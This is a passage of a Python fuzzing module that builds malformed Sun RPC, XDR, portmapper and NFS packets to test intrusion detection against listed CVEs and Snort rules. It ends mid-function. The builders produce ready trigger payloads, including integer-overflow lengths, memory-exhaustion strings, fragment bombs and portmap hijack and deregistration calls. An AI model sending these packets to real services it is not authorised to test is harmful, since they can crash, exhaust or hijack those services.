import random
import struct
import os

# ---------------------------------------------------------------------------
# SUN RPC (ONC RPC) mutation strategies for IDS/IPS fault & vulnerability
# testing.
#
# Grounded in:
#   - RFC 5531  (RPC: Remote Procedure Call Protocol Specification Version 2)
#   - RFC 4506  (XDR: External Data Representation Standard)
#   - RFC 1833  (Binding Protocols for ONC RPC Version 2 — portmapper/rpcbind)
#   - RFC 2203  (RPCSEC_GSS Protocol Specification)
#   - RFC 2695  (Authentication Mechanisms for ONC RPC — DH, Kerberos v4)
#   - RFC 7530  (NFS Version 4 Protocol)
#
# CVE grounding:
#   - CVE-2003-0028  xdr_array integer overflow in Sun RPC libraries — RCE.
#                     CERT CA-2003-10.  Affects libnsl, libc, glibc, dietlibc.
#   - CVE-2017-8779  "rpcbomb" — memory leak in libtirpc/rpcbind when parsing
#                     oversized XDR strings. DoS via OOM.
#   - CVE-2022-26937 Windows NFS NLM GETADDR stack buffer overflow (>95-byte
#                     universal address).
#   - CVE-2022-30136 Windows NFSv4 COMPOUND response size miscalculation —
#                     buffer overflow when OP_Count > 18.
#   - CVE-2022-34715 Windows NFSv4 ACL ACE_Count heap overflow
#                     (ACE_Count > 0x8000000).
#   - CVE-2023-24941 Windows NFSv4.1 utf8string RCE under low memory.
#   - CVE-2000-0666  rpc.statd format string — remote root (Linux).
#   - CVE-2002-0391  rpc.cmsd buffer overflow — remote root (Solaris).
#   - CVE-1999-0977  sadmind weak AUTH_SYS — remote root (Solaris).
#
# Snort 3 detection model:
#   - rpc_decode inspector (GID 106): TCP RM fragment normalization ONLY.
#     5 built-in rules: RPC_FRAG_TRAFFIC (106:1), RPC_MULTIPLE_RECORD
#     (106:2), RPC_LARGE_FRAGSIZE (106:3), RPC_INCOMPLETE_SEGMENT (106:4),
#     RPC_ZERO_LENGTH_FRAGMENT (106:5).
#   - ~80+ PROTOCOL-RPC content rules (GID 1, snort3-protocol-rpc.rules),
#     ALL DISABLED by default, mostly UDP.  Key SIDs: 1:1280 (portmap
#     listing), 1:9624 (AUTH_SYS machinename overflow), 1:1950/2015
#     (portmap SET/UNSET), 1:1911 (sadmind overflow), 1:1913/1915
#     (statd format string).
#   - NO deep RPC message parsing, NO XDR deserialization, NO auth
#     validation.  Detection gap vs dce_smb is massive.
#
# libtirpc source code analysis:
#   - xdr_array.c: CVE-2003-0028 patched with UINT_MAX/elsize check.
#   - xdr.c: xdr_string allocates (size+1) before verifying data available
#     (CVE-2017-8779 root cause).
#   - xdr_rec.c: RECSTREAM.fbtbc is `long`, fragment length is 31-bit from
#     RM header.  in_maxrec defaults to 0 (unlimited).
#   - svc.c: linear linked-list dispatch, no rate limiting.
#
# Transport:
#   SUN RPC uses BOTH TCP and UDP on port 111 (portmapper/rpcbind).
#   - TCP: Record Marking framing (4-byte header per fragment).
#   - UDP: Single datagram = one complete RPC message.
#   Strategy decides whether to produce TCP-framed or raw UDP payloads.
#   The mutate() return includes transport hint via dst_port:
#     111 = portmapper (UDP default, TCP for RM strategies)
#     2049 = NFS (TCP)
#   The caller (main.py) decides actual framing based on the strategy name.
# ---------------------------------------------------------------------------

SUNRPC_STRATEGIES = [
    "xdr_string_overflow",
    "xdr_array_overflow",
    "record_marking_abuse",
    "rpc_header_manipulation",
    "auth_sys_overflow",
    "auth_flavor_confusion",
    "portmap_abuse",
    "nfs_compound_overflow",
    "program_version_mismatch",
    "xdr_padding_violation",
    "tcp_segmentation_evasion",
    "reply_fuzzing",
    "null_procedure_abuse",
    "rpc_service_daemon_fuzz",
]

SUNRPC_WEIGHTS = [12, 14, 10, 8, 10, 6, 10, 14, 5, 6, 8, 5, 4, 14]

SUNRPC_STRATEGY_LABELS = {
    "xdr_string_overflow":        "XDR String Overflow (CVE-2017-8779 rpcbomb)",
    "xdr_array_overflow":         "XDR Array Integer Overflow (CVE-2003-0028)",
    "record_marking_abuse":       "Record Marking Abuse (Snort 106:1-5)",
    "rpc_header_manipulation":    "RPC Header Manipulation",
    "auth_sys_overflow":          "AUTH_SYS Field Overflow (Snort 1:9624)",
    "auth_flavor_confusion":      "Auth Flavor Confusion",
    "portmap_abuse":              "Portmapper Abuse (Snort 1:1280/1950/2015)",
    "nfs_compound_overflow":      "NFS COMPOUND Overflow (CVE-2022-30136)",
    "program_version_mismatch":   "Program/Version Mismatch",
    "xdr_padding_violation":      "XDR Padding Violation",
    "tcp_segmentation_evasion":   "TCP Segmentation Evasion",
    "reply_fuzzing":              "RPC Reply Fuzzing",
    "null_procedure_abuse":       "NULL Procedure Abuse",
    "rpc_service_daemon_fuzz":    "RPC Service Daemon Fuzz (statd/cmsd/sadmind)",
}

_MAX_UDP = 65000

# ── ONC RPC constants (RFC 5531) ─────────────────────────────────────────

# Message types
_MSG_CALL  = 0
_MSG_REPLY = 1

# RPC version (always 2)
_RPC_VERSION = 2

# Reply stat
_MSG_ACCEPTED = 0
_MSG_DENIED   = 1

# Accept stat
_ACCEPT_SUCCESS       = 0
_ACCEPT_PROG_UNAVAIL  = 1
_ACCEPT_PROG_MISMATCH = 2
_ACCEPT_PROC_UNAVAIL  = 3
_ACCEPT_GARBAGE_ARGS  = 4
_ACCEPT_SYSTEM_ERR    = 5

# Reject stat
_REJECT_RPC_MISMATCH = 0
_REJECT_AUTH_ERROR    = 1

# Auth flavors
_AUTH_NONE  = 0
_AUTH_SYS   = 1
_AUTH_SHORT = 2
_AUTH_DH    = 3
_RPCSEC_GSS = 6

# Auth stat
_AUTH_OK             = 0
_AUTH_BADCRED        = 1
_AUTH_REJECTEDCRED   = 2
_AUTH_BADVERF        = 3
_AUTH_REJECTEDVERF   = 4
_AUTH_TOOWEAK        = 5

# Well-known program numbers
_PROG_PORTMAPPER = 100000
_PROG_RSTAT      = 100001
_PROG_NFS        = 100003
_PROG_MOUNTD     = 100005
_PROG_NLM        = 100021
_PROG_STATD      = 100024
_PROG_YPSERV     = 100004
_PROG_CMSD       = 100068
_PROG_TTDBSERV   = 100083
_PROG_SADMIND    = 100232

# Portmapper v2 procedures
_PMAP_NULL    = 0
_PMAP_SET     = 1
_PMAP_UNSET   = 2
_PMAP_GETPORT = 3
_PMAP_DUMP    = 4
_PMAP_CALLIT  = 5

# RPCBIND v3/v4 procedures
_RPCB_GETADDR     = 3
_RPCB_DUMP        = 4
_RPCB_CALLIT      = 5
_RPCB_GETTIME     = 6
_RPCB_GETVERSADDR = 9
_RPCB_INDIRECT    = 10
_RPCB_GETADDRLIST = 11
_RPCB_GETSTAT     = 12

# NFS v4 procedures
_NFS4_NULL     = 0
_NFS4_COMPOUND = 1


# ── Helpers ───────────────────────────────────────────────────────────────

def _rand_xid():
    """Random 32-bit transaction ID."""
    return random.randint(1, 0xFFFFFFFE)

def _xdr_uint(val):
    """Encode a 32-bit unsigned int in XDR (big-endian)."""
    return struct.pack("!I", val & 0xFFFFFFFF)

def _xdr_int(val):
    """Encode a 32-bit signed int in XDR."""
    return struct.pack("!i", val)

def _xdr_string(s):
    """Encode an XDR string (length-prefixed, padded to 4-byte boundary)."""
    if isinstance(s, str):
        s = s.encode("utf-8")
    length = len(s)
    pad = (4 - (length % 4)) % 4
    return _xdr_uint(length) + s + b"\x00" * pad

def _xdr_opaque_fixed(data, size):
    """Encode fixed-length opaque data (padded to 4-byte boundary)."""
    pad = (4 - (size % 4)) % 4
    return data[:size] + b"\x00" * pad

def _xdr_opaque_var(data):
    """Encode variable-length opaque data."""
    length = len(data)
    pad = (4 - (length % 4)) % 4
    return _xdr_uint(length) + data + b"\x00" * pad

def _xdr_array_header(count):
    """Encode just the array element count."""
    return _xdr_uint(count)

def _auth_none():
    """AUTH_NONE credential/verifier (flavor=0, body length=0)."""
    return _xdr_uint(_AUTH_NONE) + _xdr_uint(0)

def _auth_sys(machinename=b"fuzzer", uid=0, gid=0, gids=None):
    """Build AUTH_SYS credential (RFC 5531 Appendix A)."""
    if gids is None:
        gids = []
    stamp = _xdr_uint(random.randint(0, 0xFFFFFFFF))
    name = _xdr_string(machinename)
    body = stamp + name + _xdr_uint(uid) + _xdr_uint(gid)
    body += _xdr_uint(len(gids))
    for g in gids:
        body += _xdr_uint(g)
    return _xdr_uint(_AUTH_SYS) + _xdr_opaque_var(body)

def _rpc_call(xid, prog, vers, proc, cred=None, verf=None, args=b""):
    """Build a complete RPC CALL message (no RM framing)."""
    if cred is None:
        cred = _auth_none()
    if verf is None:
        verf = _auth_none()
    msg = _xdr_uint(xid)
    msg += _xdr_uint(_MSG_CALL)
    msg += _xdr_uint(_RPC_VERSION)
    msg += _xdr_uint(prog)
    msg += _xdr_uint(vers)
    msg += _xdr_uint(proc)
    msg += cred
    msg += verf
    msg += args
    return msg

def _rpc_reply_accepted(xid, accept_stat, verf=None, data=b""):
    """Build an RPC ACCEPTED reply."""
    if verf is None:
        verf = _auth_none()
    msg = _xdr_uint(xid)
    msg += _xdr_uint(_MSG_REPLY)
    msg += _xdr_uint(_MSG_ACCEPTED)
    msg += verf
    msg += _xdr_uint(accept_stat)
    msg += data
    return msg

def _rpc_reply_denied(xid, reject_stat, data=b""):
    """Build an RPC DENIED reply."""
    msg = _xdr_uint(xid)
    msg += _xdr_uint(_MSG_REPLY)
    msg += _xdr_uint(_MSG_DENIED)
    msg += _xdr_uint(reject_stat)
    msg += data
    return msg

def _rm_frame(payload, last=True):
    """Wrap payload in a single Record Marking fragment header (TCP only).
    Bit 31 = last-fragment flag, bits 0-30 = length."""
    length = len(payload)
    header = (0x80000000 if last else 0) | (length & 0x7FFFFFFF)
    return struct.pack("!I", header) + payload

def _rm_frame_raw(header_val, payload):
    """Wrap payload with an explicit (possibly malformed) RM header."""
    return struct.pack("!I", header_val) + payload

def _clamp(payload):
    return payload[:_MAX_UDP] if len(payload) > _MAX_UDP else payload

def _portmap_mapping(prog, vers, prot, port):
    """Build a portmapper v2 mapping struct:
    struct mapping { prog, vers, prot, port }  (prot: 6=TCP, 17=UDP)"""
    return _xdr_uint(prog) + _xdr_uint(vers) + _xdr_uint(prot) + _xdr_uint(port)

def _rpcb_entry(prog, vers, netid, uaddr, owner):
    """Build an rpcbind v3/v4 rpcb struct."""
    return (_xdr_uint(prog) + _xdr_uint(vers) +
            _xdr_string(netid) + _xdr_string(uaddr) + _xdr_string(owner))


# ── Strategy builders ─────────────────────────────────────────────────────

def _build_xdr_string_overflow():
    """Strategy 1: XDR string/opaque length overflow (CVE-2017-8779 surface).

    Targets xdr_string() and xdr_bytes() in libtirpc/glibc.
    Variants:
    - max_uint_length: string length = 0xFFFFFFFF (4 GiB malloc attempt)
    - huge_length_truncated: large length field but truncated message body
    - length_exceeds_message: length field > remaining bytes in message
    - boundary_nodesize_wrap: length = 0xFFFFFFFF causing nodesize wrap to 0
    - zero_length_string: string length = 0 (edge case)
    - mismatched_opaque: opaque length says X, actual data is Y
    """
    variant = random.choice([
        "max_uint_length", "huge_length_truncated", "length_exceeds_message",
        "boundary_nodesize_wrap", "zero_length_string", "mismatched_opaque",
    ])
    xid = _rand_xid()

    if variant == "max_uint_length":
        # xdr_string with length = 0xFFFFFFFF → nodesize wraps to 0 in old code
        # Embed in a portmapper SET call: the "owner" string field
        args = _portmap_mapping(_PROG_NFS, 3, 6, 2049)
        # Append a raw oversized string length as if it were extra args
        args += struct.pack("!I", 0xFFFFFFFF) + os.urandom(64)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_SET,
                         cred=_auth_sys(), args=args)
        return call, 111

    elif variant == "huge_length_truncated":
        # Declare a huge string but provide only a few bytes — triggers
        # allocation-before-verification (rpcbomb pattern)
        str_len = random.choice([0x10000000, 0x40000000, 0x7FFFFFFF])
        # Use RPCBIND v4 GETADDR with a malformed uaddr string
        rpcb_args = (_xdr_uint(_PROG_NFS) + _xdr_uint(4) +
                     _xdr_string("tcp") +
                     struct.pack("!I", str_len) + os.urandom(16) +
                     _xdr_string("superuser"))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 4, _RPCB_GETADDR,
                         cred=_auth_sys(), args=rpcb_args)
        return call, 111

    elif variant == "length_exceeds_message":
        # String length field says 5000 but we only provide 50 bytes
        bad_str = struct.pack("!I", 5000) + os.urandom(50)
        args = _portmap_mapping(_PROG_NFS, 3, 17, 2049) + bad_str
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_SET,
                         cred=_auth_sys(), args=args)
        return call, 111

    elif variant == "boundary_nodesize_wrap":
        # size = 0xFFFFFFFE → nodesize = 0xFFFFFFFF (huge but no wrap)
        # size = 0xFFFFFFFF → nodesize = 0 (wrap!) — the exact CVE check
        size_val = random.choice([0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD])
        bad_str = struct.pack("!I", size_val) + os.urandom(32)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=bad_str)
        return call, 111

    elif variant == "zero_length_string":
        # Empty string — edge case for parsers
        args = _xdr_string(b"") + _xdr_uint(0) + _xdr_uint(0)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=args)
        return call, 111

    else:  # mismatched_opaque
        # Variable-length opaque: length says 100, provide 10 bytes
        bad_opaque = struct.pack("!I", 100) + os.urandom(10)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_SET,
                         cred=_auth_sys(), args=bad_opaque)
        return call, 111


def _build_xdr_array_overflow():
    """Strategy 2: XDR array integer overflow (CVE-2003-0028 surface).

    Targets xdr_array() — count * elsize overflow.
    Variants:
    - classic_overflow: count * elsize wraps to small value
    - huge_count_small_elsize: billions of 1-byte elements
    - zero_count: array with 0 elements (edge case)
    - count_exceeds_maxsize: element count > declared maxsize
    - mismatched_data: count says N elements, data has fewer
    - negative_count_signed: element count with high bit set (sign confusion)
    """
    variant = random.choice([
        "classic_overflow", "huge_count_small_elsize", "zero_count",
        "count_exceeds_maxsize", "mismatched_data", "negative_count_signed",
    ])
    xid = _rand_xid()

    if variant == "classic_overflow":
        # count=0x40000001 * elsize=4 = 0x100000004 → wraps to 4 on 32-bit
        count = 0x40000001
        args = _xdr_uint(count) + os.urandom(64)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "huge_count_small_elsize":
        count = random.choice([0x7FFFFFFF, 0xFFFFFFFF, 0x80000000])
        args = _xdr_uint(count) + os.urandom(128)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "zero_count":
        args = _xdr_uint(0)
        call = _rpc_call(xid, _PROG_MOUNTD, 3, 5,  # mountd v3 export
                         cred=_auth_sys(), args=args)
        return call, 111

    elif variant == "count_exceeds_maxsize":
        # Declare 1000 elements in a context where max is typically ~64
        args = _xdr_uint(1000)
        for _ in range(5):
            args += os.urandom(16)
        call = _rpc_call(xid, _PROG_STATD, 1, 1,  # statd MON
                         cred=_auth_sys(), args=args)
        return call, 111

    elif variant == "mismatched_data":
        # Says 100 elements, provides data for 3
        args = _xdr_uint(100)
        for _ in range(3):
            args += _xdr_uint(random.randint(0, 0xFFFFFFFF))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=_auth_none(), args=args)
        return call, 111

    else:  # negative_count_signed
        # High bit set — could be negative if parsed as signed int
        count = random.choice([0x80000000, 0x80000001, 0xFFFFFFFE])
        args = _xdr_uint(count) + os.urandom(64)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=_auth_none(), args=args)
        return call, 111


def _build_record_marking_abuse(payload_override=None):
    """Strategy 3: TCP Record Marking abuse (Snort 106:1-5 grounded).

    Targets xdr_rec.c RECSTREAM handling.
    Variants:
    - zero_length_fragment: RM header with length=0 (Snort 106:5)
    - oversized_fragment: length > 2^31 or very large (Snort 106:3)
    - never_ending_fragments: many fragments with last_frag=0
    - multiple_records: many complete records in one segment (Snort 106:2)
    - incomplete_segment: RM header declares more than provided (Snort 106:4)
    - split_rm_header: RM header split across fragments
    - fragment_reassembly_bomb: hundreds of tiny fragments
    """
    if payload_override is not None:
        xid = _rand_xid()
        base_call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                              cred=_auth_none())
        mid = len(payload_override) // 2
        frag1 = _rm_frame(base_call + payload_override[:mid], last=False)
        frag2 = _rm_frame(payload_override[mid:], last=True)
        return frag1 + frag2, 111
    variant = random.choice([
        "zero_length_fragment", "oversized_fragment", "never_ending_fragments",
        "multiple_records", "incomplete_segment", "split_rm_header",
        "fragment_reassembly_bomb",
    ])
    xid = _rand_xid()

    # Base RPC call for wrapping
    base_call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                          cred=_auth_none())

    if variant == "zero_length_fragment":
        # Zero-length fragment followed by actual message
        payload = _rm_frame_raw(0x00000000, b"")  # last=0, len=0
        payload += _rm_frame(base_call)
        return payload, 111

    elif variant == "oversized_fragment":
        # Declare impossibly large fragment
        huge_len = random.choice([0x7FFFFFFF, 0x7FFFFFFE, 0x40000000])
        header_val = 0x80000000 | huge_len  # last=1, huge length
        payload = struct.pack("!I", header_val) + base_call[:64]
        return payload, 111

    elif variant == "never_ending_fragments":
        # Many fragments with last_frag=0, never sending last
        payload = b""
        chunk_size = random.randint(4, 32)
        data = base_call + os.urandom(200)
        for i in range(0, min(len(data), 500), chunk_size):
            chunk = data[i:i + chunk_size]
            payload += _rm_frame(chunk, last=False)
        return payload, 111

    elif variant == "multiple_records":
        # Many complete RPC records in one TCP segment
        payload = b""
        for i in range(random.randint(10, 50)):
            call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, _PMAP_NULL,
                             cred=_auth_none())
            payload += _rm_frame(call)
        return _clamp(payload), 111

    elif variant == "incomplete_segment":
        # RM header says 500 bytes but we only send 20
        header_val = 0x80000000 | 500
        payload = struct.pack("!I", header_val) + base_call[:20]
        return payload, 111

    elif variant == "split_rm_header":
        # Send 2 bytes of RM header, then remaining 2 + data
        full = _rm_frame(base_call)
        part1 = full[:2]
        part2 = full[2:]
        # Concatenate with a marker (caller handles TCP segmentation)
        return part1 + part2, 111

    else:  # fragment_reassembly_bomb
        # Hundreds of 1-byte fragments
        payload = b""
        data = base_call
        for byte in data[:200]:
            if isinstance(byte, int):
                payload += _rm_frame(bytes([byte]), last=False)
            else:
                payload += _rm_frame(byte, last=False)
        # Final empty last fragment
        payload += _rm_frame(b"", last=True)
        return payload, 111


def _build_rpc_header_manipulation():
    """Strategy 4: RPC message header field manipulation.

    Targets svc_getreqset dispatch and client-side reply parsing.
    Variants:
    - bad_rpcvers: rpcvers != 2
    - bad_msg_type: msg_type not CALL(0) or REPLY(1)
    - xid_boundary: xid=0 or xid=0xFFFFFFFF
    - prog_reserved_range: program number in reserved range
    - huge_procedure_number: proc > 0xFFFFFF
    - double_call: two CALL messages concatenated in one record
    """
    variant = random.choice([
        "bad_rpcvers", "bad_msg_type", "xid_boundary",
        "prog_reserved_range", "huge_procedure_number", "double_call",
    ])
    xid = _rand_xid()

    if variant == "bad_rpcvers":
        rpcvers = random.choice([0, 1, 3, 0xFFFFFFFF, 0x80000000])
        msg = _xdr_uint(xid) + _xdr_uint(_MSG_CALL) + _xdr_uint(rpcvers)
        msg += _xdr_uint(_PROG_PORTMAPPER) + _xdr_uint(2) + _xdr_uint(_PMAP_NULL)
        msg += _auth_none() + _auth_none()
        return msg, 111

    elif variant == "bad_msg_type":
        mtype = random.choice([2, 3, 0xFFFFFFFF, 0x80000000, 255])
        msg = _xdr_uint(xid) + _xdr_uint(mtype)
        msg += _xdr_uint(_RPC_VERSION)
        msg += _xdr_uint(_PROG_PORTMAPPER) + _xdr_uint(2) + _xdr_uint(0)
        msg += _auth_none() + _auth_none()
        return msg, 111

    elif variant == "xid_boundary":
        xid_val = random.choice([0, 0xFFFFFFFF, 0x80000000, 1])
        call = _rpc_call(xid_val, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=_auth_none())
        return call, 111

    elif variant == "prog_reserved_range":
        prog = random.choice([
            0, 0x60000000, 0x7F000000, 0x80000000, 0xFFFFFFFF,
            0x20000000, 0x3FFFFFFF,
        ])
        call = _rpc_call(xid, prog, 1, 0, cred=_auth_none())
        return call, 111

    elif variant == "huge_procedure_number":
        proc = random.choice([0xFFFFFFFF, 0x7FFFFFFF, 999999, 0x80000000])
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, proc, cred=_auth_none())
        return call, 111

    else:  # double_call
        call1 = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, _PMAP_NULL,
                          cred=_auth_none())
        call2 = _rpc_call(_rand_xid(), _PROG_NFS, 4, _NFS4_COMPOUND,
                          cred=_auth_sys(), args=os.urandom(64))
        return call1 + call2, 111


def _build_auth_sys_overflow():
    """Strategy 5: AUTH_SYS credential overflow (Snort 1:9624 grounded).

    Targets authsys_parms parsing in svc dispatch.
    Variants:
    - machinename_overflow: machinename > 255 bytes (RFC limit)
    - gids_overflow: gids array > 16 entries (RFC limit)
    - gids_int_overflow: gids count * 4 integer overflow
    - empty_machinename: zero-length machinename
    - uid_gid_boundary: uid/gid = 0xFFFFFFFF or 0
    - oversized_auth_body: opaque_auth body > 400 bytes (RFC max)
    """
    variant = random.choice([
        "machinename_overflow", "gids_overflow", "gids_int_overflow",
        "empty_machinename", "uid_gid_boundary", "oversized_auth_body",
    ])
    xid = _rand_xid()

    if variant == "machinename_overflow":
        # machinename > 255 bytes
        name_len = random.choice([256, 512, 1024, 4096])
        name = os.urandom(name_len)
        cred = _auth_sys(machinename=name, uid=0, gid=0)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    elif variant == "gids_overflow":
        # > 16 supplemental groups
        gid_count = random.choice([17, 32, 64, 256])
        gids = [random.randint(0, 65535) for _ in range(gid_count)]
        cred = _auth_sys(machinename=b"overflow", uid=0, gid=0, gids=gids)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    elif variant == "gids_int_overflow":
        # gids count = 0x40000001 → count*4 wraps to 4 bytes
        stamp = _xdr_uint(random.randint(0, 0xFFFFFFFF))
        name = _xdr_string(b"intoverflow")
        body = stamp + name + _xdr_uint(0) + _xdr_uint(0)
        body += _xdr_uint(0x40000001)  # gids count
        body += os.urandom(64)  # fake gid data
        cred = _xdr_uint(_AUTH_SYS) + _xdr_opaque_var(body)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    elif variant == "empty_machinename":
        cred = _auth_sys(machinename=b"", uid=1000, gid=1000)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=cred)
        return call, 111

    elif variant == "uid_gid_boundary":
        uid = random.choice([0, 0xFFFFFFFF, 65534, 0x80000000])
        gid = random.choice([0, 0xFFFFFFFF, 65534, 0x80000000])
        cred = _auth_sys(machinename=b"boundary", uid=uid, gid=gid)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    else:  # oversized_auth_body
        # opaque_auth body > 400 bytes (RFC 5531 limit)
        body_size = random.choice([401, 500, 1024, 4096])
        body = os.urandom(body_size)
        cred = _xdr_uint(_AUTH_SYS) + _xdr_opaque_var(body)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111


def _build_auth_flavor_confusion():
    """Strategy 6: Authentication flavor confusion.

    Targets auth_flavor dispatch and opaque_auth parsing.
    Variants:
    - invalid_flavor: flavor values not in spec (5, 7, 255, 0xFFFFFFFF)
    - cred_verf_mismatch: credential is AUTH_SYS, verifier is AUTH_DH
    - auth_dh_malformed: AUTH_DH with garbage body
    - rpcsec_gss_malformed: RPCSEC_GSS with garbage token
    - auth_short_invalid: AUTH_SHORT with oversized/garbage handle
    - flavor_zero_large_body: AUTH_NONE with non-zero body length
    """
    variant = random.choice([
        "invalid_flavor", "cred_verf_mismatch", "auth_dh_malformed",
        "rpcsec_gss_malformed", "auth_short_invalid", "flavor_zero_large_body",
    ])
    xid = _rand_xid()

    if variant == "invalid_flavor":
        flavor = random.choice([5, 7, 100, 255, 0xFFFFFFFF, 0x80000000])
        cred = _xdr_uint(flavor) + _xdr_opaque_var(os.urandom(32))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    elif variant == "cred_verf_mismatch":
        cred = _auth_sys(machinename=b"mismatch", uid=0, gid=0)
        verf = _xdr_uint(_AUTH_DH) + _xdr_opaque_var(os.urandom(72))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred, verf=verf)
        return call, 111

    elif variant == "auth_dh_malformed":
        # AUTH_DH body should be structured (netname, encrypted fields)
        # Send garbage instead
        body = os.urandom(random.randint(8, 200))
        cred = _xdr_uint(_AUTH_DH) + _xdr_opaque_var(body)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    elif variant == "rpcsec_gss_malformed":
        # RPCSEC_GSS with garbage GSS token
        body = os.urandom(random.randint(16, 300))
        cred = _xdr_uint(_RPCSEC_GSS) + _xdr_opaque_var(body)
        verf = _xdr_uint(_RPCSEC_GSS) + _xdr_opaque_var(os.urandom(32))
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, verf=verf)
        return call, 2049

    elif variant == "auth_short_invalid":
        body_size = random.choice([0, 1, 100, 400, 500])
        body = os.urandom(body_size) if body_size > 0 else b""
        cred = _xdr_uint(_AUTH_SHORT) + _xdr_opaque_var(body)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111

    else:  # flavor_zero_large_body
        # AUTH_NONE should have body length = 0, but we give it data
        body = os.urandom(random.randint(1, 400))
        cred = _xdr_uint(_AUTH_NONE) + _xdr_opaque_var(body)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=cred)
        return call, 111


def _build_portmap_abuse():
    """Strategy 7: Portmapper/RPCBIND abuse (Snort 1:1280/1950/2015).

    Targets portmapper/rpcbind service itself.
    Variants:
    - dump_listing: PMAPPROC_DUMP to enumerate services (Snort 1:1280)
    - set_hijack: PMAPPROC_SET to register a rogue service (Snort 1:1950)
    - unset_deregister: PMAPPROC_UNSET to deregister NFS (Snort 1:2015)
    - callit_amplification: PMAPPROC_CALLIT broadcast abuse
    - getport_nonexistent: GETPORT for nonexistent program
    - getaddr_overflow: RPCBIND GETADDR with oversized uaddr (CVE-2022-26937)
    - gettime_abuse: RPCBIND GETTIME
    """
    variant = random.choice([
        "dump_listing", "set_hijack", "unset_deregister",
        "callit_amplification", "getport_nonexistent", "getaddr_overflow",
        "gettime_abuse",
    ])
    xid = _rand_xid()

    if variant == "dump_listing":
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                         cred=_auth_none())
        return call, 111

    elif variant == "set_hijack":
        # Register a rogue NFS on a random port
        rogue_port = random.randint(1025, 65535)
        args = _portmap_mapping(_PROG_NFS, 3, 6, rogue_port)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_SET,
                         cred=_auth_sys(uid=0, gid=0), args=args)
        return call, 111

    elif variant == "unset_deregister":
        # Deregister NFS
        args = _portmap_mapping(_PROG_NFS, 3, 6, 2049)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_UNSET,
                         cred=_auth_sys(uid=0, gid=0), args=args)
        return call, 111

    elif variant == "callit_amplification":
        # CALLIT (indirect call) — amplification vector
        inner_args = os.urandom(random.randint(0, 64))
        args = (_xdr_uint(_PROG_NFS) + _xdr_uint(3) + _xdr_uint(0) +
                _xdr_opaque_var(inner_args))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_CALLIT,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "getport_nonexistent":
        prog = random.choice([999999, 0xDEADBEEF, 0, 1])
        args = _portmap_mapping(prog, 1, 17, 0)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "getaddr_overflow":
        # CVE-2022-26937: oversized universal address in GETADDR response
        # This crafts a request, but the attack surface is the RESPONSE.
        # We'll craft a malicious GETADDR reply with >95 byte uaddr.
        oversized_uaddr = b"A" * random.choice([96, 200, 500, 1000])
        rpcb_args = (_xdr_uint(_PROG_NLM) + _xdr_uint(4) +
                     _xdr_string("tcp") + _xdr_string(oversized_uaddr) +
                     _xdr_string("superuser"))
        call = _rpc_call(xid, _PROG_PORTMAPPER, 4, _RPCB_GETADDR,
                         cred=_auth_sys(), args=rpcb_args)
        return call, 111

    else:  # gettime_abuse
        call = _rpc_call(xid, _PROG_PORTMAPPER, 4, _RPCB_GETTIME,
                         cred=_auth_none())
        return call, 111


def _build_nfs_compound_overflow():
    """Strategy 8: NFS COMPOUND overflow (CVE-2022-30136/34715/23-24941).

    Targets Windows NFS and Linux nfsd COMPOUND processing.
    Variants:
    - many_ops: COMPOUND with >18 operations (CVE-2022-30136 trigger)
    - ace_count_overflow: ACL with ACE_Count > 0x8000000 (CVE-2022-34715)
    - utf8string_huge: oversized utf8string (CVE-2023-24941)
    - zero_ops: COMPOUND with 0 operations
    - single_invalid_op: single operation with invalid opcode
    - nested_compound: COMPOUND inside COMPOUND args
    """
    variant = random.choice([
